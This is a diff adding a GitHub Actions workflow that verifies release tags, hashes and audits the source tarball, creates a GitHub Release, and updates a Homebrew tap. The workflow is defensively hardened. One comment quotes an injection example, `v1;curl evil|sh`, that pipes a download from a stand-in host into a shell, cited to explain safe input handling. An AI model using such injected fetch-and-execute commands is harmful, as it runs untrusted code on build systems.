@@ -1,0 +1,283 @@
+# Release: tag-triggered GitHub Release + Homebrew tap update.
+#
+# Flow (docs/done/task-14-release-and-brew-tap.md, docs/release-process.md):
+#   1. release    - verifies tag<->commit<->VERSION, downloads the *published*
+#                   source tarball (same bytes brew users get), audits it, and
+#                   creates the GitHub Release with auto-generated notes.
+#   2. update-tap - renders Formula/aidc.rb (+ Formula/aidc@MAJOR.MINOR.rb) and
+#                   commits them to the separate pacepace/homebrew-aidc tap repo.
+#
+# Full-stack smoke is deliberately NOT run here. Since 0.6.1, smoke does not run
+# on hosted GitHub runners at all (smoke.yml is workflow_call-only); the
+# authoritative end-to-end gate is `make smoke` on the maintainer's machine
+# BEFORE pushing the tag (CONTRIBUTING.md "Releases"). The release keeps its own
+# cheap gates: the tag<->commit<->VERSION checks and the two tarball audits below.
+#
+# Triggers:
+#   push: tags ['v*']   -> a REAL release (the only way to ship).
+#   workflow_dispatch   -> DRY-RUN ONLY. Every step runs except the two with
+#                          side effects (GitHub Release create, tap push), which
+#                          are gated on `github.event_name == 'push'`. There is no
+#                          `dry_run=false` input by construction, so a compromised
+#                          maintainer with workflow-trigger rights cannot ship a
+#                          release without pushing a tag. Used to verify token
+#                          rotation (see docs/release-process.md).
+#
+# Docker images are deliberately NOT built or pushed here (REL-08): every user's
+# machine builds locally on first `aidc create`.
+#
+# Security posture: top-level permissions empty; per-job grants only. All actions
+# SHA-pinned. No `set -x`/env dumps. The cross-repo tap write uses TAP_REPO_TOKEN
+# (a fine-scoped PAT), never GITHUB_TOKEN.
+name: release
+
+on:
+  push:
+    tags: ['v*']
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: 'Existing tag to dry-run against (e.g. v0.1.0). Dry-run ONLY.'
+        type: string
+        required: true
+
+permissions: {}
+
+# cancel-in-progress: false -- a release cancelled mid-tap-update leaves the world
+# inconsistent (Release exists but tap still points at the old version). Queue
+# instead. The `release-` prefix isolates this from PR-time `smoke-*` runs.
+concurrency:
+  group: release-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  release:
+    name: create GitHub Release
+    runs-on: ubuntu-latest
+    # justify: contents: write is required to create the GitHub Release on tag push.
+    permissions:
+      contents: write
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    outputs:
+      version: ${{ steps.meta.outputs.version }}
+      sha256: ${{ steps.sha.outputs.sha256 }}
+      tap_enabled: ${{ steps.tapcheck.outputs.tap_enabled }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ inputs.tag || github.ref }}
+
+      # The raw tag arrives via `env:` (NOT `${{ }}` interpolation into the script
+      # body) so a malicious workflow_dispatch input like `v1;curl evil|sh` cannot
+      # inject shell before validation. Downstream steps use the validated $TAG.
+      - name: Validate tag input
+        id: meta
+        env:
+          RAW_TAG: ${{ inputs.tag || github.ref_name }}
+        run: |
+          TAG="$RAW_TAG"
+          case "$TAG" in
+            v[0-9]*) : ;;
+            *) echo "::error::invalid tag input '${TAG}'"; exit 1 ;;
+          esac
+          if ! printf '%s' "$TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+([.-][a-zA-Z0-9]([a-zA-Z0-9.]*[a-zA-Z0-9])?)?(\+[a-zA-Z0-9]([a-zA-Z0-9.]*[a-zA-Z0-9])?)?$'; then
+            echo "::error::tag '${TAG}' does not match canonical v[MAJOR].[MINOR].[PATCH][pre][+build]"
+            exit 1
+          fi
+          echo "TAG=${TAG}" >> "$GITHUB_ENV"
+          echo "version=${TAG}" >> "$GITHUB_OUTPUT"
+
+      - name: Tag <-> VERSION sync check
+        run: |
+          FILE_VER="$(tr -d '[:space:]' < VERSION)"
+          if [ "$TAG" != "$FILE_VER" ]; then
+            echo "::error::tag ${TAG} != VERSION file ${FILE_VER}"
+            exit 1
+          fi
+
+      # HEAD is the tag's commit on both push and dispatch (we checked out the tag).
+      - name: Record expected commit
+        run: echo "EXPECTED_SHA=$(git rev-parse HEAD)" >> "$GITHUB_ENV"
+
+      # `commits/<tag>` dereferences annotated AND lightweight tags to the commit,
+      # so this is correct regardless of how the tag was created.
+      - name: Verify tag points at the built commit (pre-download)
+        run: |
+          ACTUAL_SHA="$(gh api "repos/${GITHUB_REPOSITORY}/commits/${TAG}" --jq '.sha')"
+          if [ "$EXPECTED_SHA" != "$ACTUAL_SHA" ]; then
+            echo "::error::tag ${TAG} points at ${ACTUAL_SHA}, not the built commit ${EXPECTED_SHA}"
+            exit 1
+          fi
+
+      # Download the published tarball (not `actions/checkout`) so our sha256 is
+      # over the exact bytes GitHub serves for the tag. The formula's `url` is
+      # `github.com/<repo>/archive/refs/tags/<tag>.tar.gz`, which redirects to
+      # this codeload endpoint -- hash THAT byte stream, not the API tarball
+      # (`api.github.com/.../tarball/<tag>`), whose archive has a different
+      # top-level prefix and gzip stream and therefore a different sha256. The
+      # auth header makes this work while the repo is private and is harmless
+      # once it is public.
+      - name: Download published source tarball
+        run: |
+          curl -fsSL -H "Authorization: Bearer ${GH_TOKEN}" \
+            -o release-tarball.tar.gz \
+            "https://codeload.github.com/${GITHUB_REPOSITORY}/tar.gz/refs/tags/${TAG}"
+
+      # Closes the TOCTOU window: if the tag was re-pointed during the download,
+      # abort before we hash / release anything.
+      - name: Verify tag unchanged (post-download)
+        run: |
+          ACTUAL_SHA="$(gh api "repos/${GITHUB_REPOSITORY}/commits/${TAG}" --jq '.sha')"
+          if [ "$EXPECTED_SHA" != "$ACTUAL_SHA" ]; then
+            echo "::error::tag was re-pointed during tarball download; aborting"
+            exit 1
+          fi
+
+      - name: Compute tarball sha256
+        id: sha
+        run: |
+          SHA256="$(sha256sum release-tarball.tar.gz | awk '{print $1}')"
+          echo "SHA256=${SHA256}" >> "$GITHUB_ENV"
+          echo "sha256=${SHA256}" >> "$GITHUB_OUTPUT"
+
+      # Two independent audits: the git tree (source) AND the extracted tarball
+      # (catches .gitattributes export-subst / export-ignore divergence). Either
+      # finding a forbidden path fails the release.
+      - name: Audit git tree
+        run: bash release/tarball-audit.sh
+
+      - name: Audit extracted tarball
+        run: bash release/tarball-audit-extracted.sh release-tarball.tar.gz
+
+      # Does the tap PAT exist? If not, skip the tap update gracefully (the
+      # GitHub Release still ships). Auto-enables once the secret is configured;
+      # no operator flag needed. Presence-only check -- the value is never logged.
+      - name: Check tap token availability
+        id: tapcheck
+        env:
+          TAP_TOKEN: ${{ secrets.TAP_REPO_TOKEN_EXPIRES_2026_09_30 }}
+        run: |
+          if [ -n "${TAP_TOKEN}" ]; then
+            echo "tap_enabled=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "tap_enabled=false" >> "$GITHUB_OUTPUT"
+            echo "::notice::TAP_REPO_TOKEN secret not set; skipping Homebrew tap update (see docs/release-process.md)."
+          fi
+
+      - name: Create GitHub Release
+        if: github.event_name == 'push'
+        uses: softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228 # v3.0.2
+        with:
+          tag_name: ${{ github.ref_name }}
+          name: ${{ github.ref_name }}
+          generate_release_notes: true
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Dry-run summary
+        if: github.event_name != 'push'
+        run: |
+          echo "DRY-RUN OK: ${TAG} sha256=${SHA256}"
+          echo "No GitHub Release created and no tap push (workflow_dispatch is dry-run only)."
+
+  update-tap:
+    name: update Homebrew tap
+    needs: [release]
+    # Skipped when the tap PAT isn't configured yet (first-boot / pre-tap-setup).
+    if: needs.release.outputs.tap_enabled == 'true'
+    runs-on: ubuntu-latest
+    # The cross-repo write uses TAP_REPO_TOKEN; GITHUB_TOKEN needs only read here.
+    permissions:
+      contents: read
+    steps:
+      - name: Checkout this repo (formula templates)
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ inputs.tag || github.ref }}
+          path: src
+
+      - name: Checkout tap repo
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          repository: pacepace/homebrew-aidc
+          token: ${{ secrets.TAP_REPO_TOKEN_EXPIRES_2026_09_30 }}
+          path: tap
+
+      - name: Render + validate formulae
+        env:
+          VERSION: ${{ needs.release.outputs.version }}
+          SHA256: ${{ needs.release.outputs.sha256 }}
+          # Manual override for the rare case auto-detection is wrong (see
+          # docs/release-process.md). Default 0 = let the workflow decide.
+          SKIP_UNVERSIONED: ${{ vars.SKIP_UNVERSIONED || '0' }}
+        run: |
+          # Derive MAJOR_MINOR from the tag, tolerating pre-release/build suffixes.
+          MAJOR_MINOR="$(printf '%s\n' "$VERSION" | sed -E 's/^v([0-9]+\.[0-9]+).*/\1/')"
+          case "$MAJOR_MINOR" in
+            [0-9]*.[0-9]*) : ;;
+            *) echo "::error::could not derive MAJOR_MINOR from ${VERSION}"; exit 1 ;;
+          esac
+          # Homebrew derives the expected class name by DELETING dots from the
+          # name after "@" (Formulary.class_s: "aidc@1.0" -> AidcAT10), so the
+          # safe form must drop the dot, not replace it with an underscore.
+          MAJOR_MINOR_SAFE="${MAJOR_MINOR//./}"
+
+          # Charset-validate every substitution value before it touches a template.
+          for v in "$VERSION" "$SHA256" "$MAJOR_MINOR" "$MAJOR_MINOR_SAFE"; do
+            case "$v" in
+              *[!a-zA-Z0-9._-]*|"")
+                echo "::error::substitution value contains forbidden characters: '$v'"
+                exit 1 ;;
+            esac
+          done
+
+          # Update the unversioned formula only if this tag is >= the currently
+          # published one (never downgrade users on a newer line via a hotfix to
+          # an older line). sort -V semantics are GNU/ubuntu-latest specific.
+          UPDATE_UNVERSIONED=1
+          if [ -f tap/Formula/aidc.rb ]; then
+            CURRENT="$(grep -E '^\s+url\s+' tap/Formula/aidc.rb | sed -E 's/.*archive\/refs\/tags\/([^"]+)\.tar\.gz.*/\1/')"
+            HIGHEST="$(printf '%s\n%s\n' "$CURRENT" "$VERSION" | sort -V | tail -1)"
+            if [ "$HIGHEST" != "$VERSION" ]; then
+              UPDATE_UNVERSIONED=0
+            fi
+          fi
+          if [ "${SKIP_UNVERSIONED}" = "1" ]; then
+            UPDATE_UNVERSIONED=0
+          fi
+
+          render() { # template dest
+            sed -e "s/__VERSION__/${VERSION}/g" \
+                -e "s/__SHA256__/${SHA256}/g" \
+                -e "s/__VERSION_TAG__/${MAJOR_MINOR}/g" \
+                -e "s/__VERSION_TAG_SAFE__/${MAJOR_MINOR_SAFE}/g" \
+                "$1" > "$2"
+            ruby -c "$2"
+          }
+
+          mkdir -p tap/Formula
+          if [ "$UPDATE_UNVERSIONED" = "1" ]; then
+            render src/release/Formula/aidc.rb.tmpl "tap/Formula/aidc.rb"
+          else
+            echo "::notice::tag ${VERSION} is older than the published line; leaving unversioned Formula/aidc.rb unchanged."
+          fi
+          render "src/release/Formula/aidc@version.rb.tmpl" "tap/Formula/aidc@${MAJOR_MINOR}.rb"
+
+      - name: Commit to tap
+        run: |
+          # committer email is a github.com noreply that resolves committer.login
+          # to `pacepace`, which the tap-repo daily cron alert expects. Keep this
+          # in sync with that cron filter (docs/release-process.md).
+          git -C tap config user.name "pacepace"
+          git -C tap config user.email "pacepace@users.noreply.github.com"
+          git -C tap add Formula/
+          if git -C tap diff --cached --quiet; then
+            echo "::notice::no formula changes to commit."
+            exit 0
+          fi
+          git -C tap commit -m "aidc ${{ needs.release.outputs.version }}" \
+            -m "${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}"
+
+      - name: Push to tap
+        if: github.event_name == 'push'
+        run: git -C tap push origin HEAD:main
